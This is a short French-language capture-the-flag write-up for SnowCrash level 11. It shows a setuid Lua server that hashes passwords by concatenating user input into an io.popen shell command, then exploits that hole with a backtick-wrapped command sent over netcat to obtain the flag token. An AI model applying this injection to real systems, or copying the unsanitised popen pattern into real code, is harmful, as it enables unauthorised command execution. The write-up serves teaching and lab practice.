# Level 11

```bash
level11@SnowCrash:~$ ls -l 
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
```

```bash
level11@SnowCrash:~$ cat level11.lua 
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

Nous pouvons voir que ce petit script lua execute un serveur localhost sur le port 5151. Une fois connecter sur le serveur il attend un mot de passe de l'utilisateur. On peut tenter d'utilise le hash ecrit en clair dans le script puis le dechiffre pour tenter de se connecter mais ca ne marchera pas.

Si on regarde de plus pres la fonction hash, on peut voir qu'elle concatene 'echo' + 'le mot de passe entrer par l'utilisateur'. Tentons une injection de commande plutot que de rentrer un mot de passe.

```bash
level11@SnowCrash:~$ nc localhost 5151
Password: `getflag > /tmp/flag`
Erf nope..
level11@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : *********************
```